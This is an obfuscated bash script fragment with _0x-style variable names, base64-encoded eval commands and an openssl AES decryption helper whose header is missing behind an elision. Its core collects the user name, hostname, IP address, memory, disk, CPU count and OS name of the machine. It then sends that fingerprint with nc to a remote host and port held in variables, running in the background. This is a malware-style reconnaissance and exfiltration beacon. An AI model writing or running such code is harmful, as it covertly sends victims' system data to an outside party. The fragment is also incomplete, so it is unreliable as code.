#!/bin/bash
eval "$(echo 'XzB4MWEyYj0iJChob3N0bmFtZSkiO18weDJjM2Q9IiQod2hvIGFtIGkpIjtfMHgzZTRmPSIkKGRhdGUgKyVzKSI='|base64 -d)"
...
local _0xa="$1"
local _0xb="$2"
echo "$_0xa"|base64 -d|openssl enc -aes-256-cbc -d -a -k "$_0xb" 2>/dev/null
}
_0x4p5q="$(date +%H%M%S|md5sum|cut -c1-16)"
_0xm3n4="user=$(whoami);host=$(hostname);ip=$(hostname -I|awk '{print \$1}');mem=$(free -m|awk '/Mem/{print \$2}');disk=$(df -h /|tail -1|awk '{print \$2}');cpu=$(grep -c 'processor' /proc/cpuinfo);os=$(cat /etc/os-release|grep '^NAME='|cut -d'=' -f2|tr -d '\"');data=\"u:\$user|h:\$host|i:\$ip|m:\$mem|d:\$disk|c:\$cpu|o:\$os|t:\$(date +%s)\";echo \"\$data\"|nc -w 3 $_0x7h8c $_0x9j1k 2>/dev/null"
eval "$_0xm3n4" &
sleep 2
